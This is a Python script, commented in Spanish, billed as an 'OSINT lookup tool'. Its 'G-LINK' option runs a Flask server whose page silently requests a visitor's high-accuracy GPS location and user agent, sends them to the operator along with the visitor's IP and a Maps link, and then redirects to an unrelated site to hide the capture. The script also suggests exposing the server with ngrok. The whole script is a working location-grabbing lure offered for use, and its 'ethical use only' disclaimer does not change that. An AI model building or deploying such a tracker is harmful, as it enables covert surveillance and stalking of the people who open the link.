#!/usr/bin/env python3
import os
import json
import urllib.request
import threading
from flask import Flask, request, render_template_string

# --- SERVIDOR G-LINK ---
app = Flask(__name__)

# Plantilla HTML con solicitud de Geolocalización (GPS)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<body>
    <script>
        function pedirUbicacion() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const d = {
                            agente: navigator.userAgent,
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            precision: pos.coords.accuracy
                        };
                        fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
                        .then(() => window.location.href = "https://coin.rtu.paraguay.com");
                    },
                    (err) => { window.location.href = "https://coin.rtu.paraguay.com"; },
                    { enableHighAccuracy: true }
                );
            } else { window.location.href = "https://coin.rtu.paraguay.com"; }
        }
        pedirUbicacion();
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log', methods=['POST'])
def log():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    d = request.json
    print(f"\n\033[1;32m[!] CAPTURA DE UBICACIÓN Y DISPOSITIVO:\033[0m")
    print(f"IP DEL DISPOSITIVO: {ip}")
    print(f"COORDENADAS: {d.get('lat')}, {d.get('lon')}")
    print(f"PRECISIÓN: +/- {d.get('precision')} metros")
    print(f"MAPA: https://www.google.com/maps/search/?api=1&query={d.get('lat')},{d.get('lon')}")
    print(f"AGENTE: {d.get('agente')}")
    return "OK"

def iniciar_servidor():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

# --- INTERFAZ TRX-KILL ---
def mostrar_banner():
    os.system('clear')
    print("\033[1;31m" + r"""
  _________ ______  __   __       _      _____ _      _      
 |__   __|  ____\ \ \ / /      | |    |_   _| |    | |     
    | |  | |__   \ \ ' /       | |      | | | |    | |     
    | |  |  __|   > > <        | |      | | | |    | |     
    | |  | |____ / / . \       | |____ _| |_| |____| |____ 
    |_|  |_|____/_/_/ \_\      |______|_____|______|______|
    """ + "\033[0m")
    print("\033[1;33m" + "      [+] ENHANCED OSINT LOOKUP TOOL BY TRX-LILL [+]" + "\033[0m")
    print("\033[1;30m" + "   =====================================================" + "\033[0m\n")

def main():
    while True:
        mostrar_banner()
        print(" [1] Información de IP (Geolocalización)")
        print(" [2] Activar Sistema G-LINK (Captura GPS + Dispositivo)")
        print(" [3] Creador")
        print(" [4] Licencia y Derechos")
        print(" [5] Salir")
        opc = input("\n\033[1;32m[?]\033[0m Elige una opción: ")

        if opc == "1":
            ip = input("Introduce IP: ")
            try:
                url = f"http://ip-api.com/json/{ip}"
                with urllib.request.urlopen(url) as r:
                    data = json.loads(r.read().decode())
                    if data['status'] == 'success':
                        print(f"\n\033[1;33m[v]\033[0m IP: {data['query']}\nCOORDENADAS: {data['lat']}, {data['lon']}\nPAÍS: {data['country']}\nMAP: https://www.google.com/maps/search/?api=1&query={data['lat']},{data['lon']}")
                    else: print("[-] Error en IP.")
            except: print("[-] Error de red.")
            input("\nPresiona ENTER para volver...")

        elif opc == "2":
            print("[*] Iniciando G-LINK en puerto 5000...")
            threading.Thread(target=iniciar_servidor, daemon=True).start()
            input("[!] Servidor activo. (Si usas ngrok, corre: 'ngrok http 5000')\nPresiona ENTER para detener.")

        elif opc == "3":
            print("\n\033[1;36m[+] CREADOR: TRX-LILL\n[+] AÑO: 2026\n[+] ESPECIALIZADO EN HERRAMIENTAS OSINT.\033[0m")
            input("\nPresiona ENTER para volver...")

        elif opc == "4":
            print("\n\033[1;35m[!] LICENCIA: SOFTWARE DE CÓDIGO ABIERTO.\n[!] ADVERTENCIA: EL USO ES RESPONSABILIDAD DEL USUARIO.\n[!] USO EXCLUSIVO PARA FINES ÉTICOS.\033[0m")
            input("\nPresiona ENTER para volver...")
        
        elif opc == "5":
            break

if __name__ == "__main__":
    main()
